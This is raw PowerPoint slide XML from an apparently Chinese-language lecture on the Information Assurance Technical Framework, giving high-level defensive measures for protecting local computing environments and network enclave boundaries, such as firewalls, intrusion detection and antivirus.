          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4740"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23" name="Text Box 20"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2835" y="2976"/>
              <a:ext cx="1945"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1100" b="1">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>支撑性基础设施</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="515910" y="3727558"/>
            <a:ext cx="8016529" cy="461665"/>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dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>这四个领域构成了完整的信息保障体系所涉及的范围</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="4581128"/>
            <a:ext cx="8280920" cy="830997"/>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dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>在每个领域范围内，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>都描述了其特有的安全需求和相应的可供选择的技术措施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33967085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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="921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6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2163">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9216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16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2163">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9216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216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2163">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9216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6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2163">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9216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21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ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fad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ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="3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additive="base">
                                        <p:cTn id="42" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="4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p:bldP spid="2" grpId="0"/>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ChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="653786" y="2780928"/>
            <a:ext cx="6657528" cy="3275632"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>方法：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>使用安全的操作系统</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>使用安全的应用程序</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全消息传递、安全浏览、文件保护等</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>主机入侵检测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>防病毒系统</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>主机脆弱性扫描</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>文件完整性保护</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94211" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="764704"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>技术焦点领域</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：保护本地计算环境</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="619568" y="1490125"/>
            <a:ext cx="7704856" cy="1218795"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>目标：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>使用信息保障技术确保数据在进人、离开或驻留客户机和服务器时具有保密性、完整性和可用性。</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5936" y="2880752"/>
            <a:ext cx="5068176" cy="3175808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29960635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4210">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9421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4210">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4210">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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4210">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>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4210">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="27" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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4210">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4210">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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4210">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>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94210">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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4210">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94210">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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4210">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>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4210">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9421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4210">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4210">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="94210">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421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build="p"/>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968156" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>技术焦点领域</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：保护区域边界</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95235" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="572542" y="3810104"/>
            <a:ext cx="7236916" cy="2428432"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>方法：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>病毒、恶意代码防御</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>防火墙</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>人侵检测</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>边界护卫</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>远程访问</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>多级别安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="559754" y="1339729"/>
            <a:ext cx="8568952" cy="1335750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>什么是边界（或安全域）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>“域”指由单一授权通过专用或物理安全措施所控制的环境，包括物理环境和逻辑环境。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>区域的网络设备与其它网络设备的接入点被称为“区域边界”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539634" y="2783790"/>
            <a:ext cx="8280837" cy="997196"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>目标：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>对进出某区域（物理区域或逻辑区域）的数据流进行有效的控制与监视。</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8064" y="3933056"/>
            <a:ext cx="3033037" cy="2130708"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21358031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5235">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9523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5235">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5235">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="95235">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5235">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>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5235">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="27" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="95235">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5235">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5235">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9523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5235">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>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95235">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="95235">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5235">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95235">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
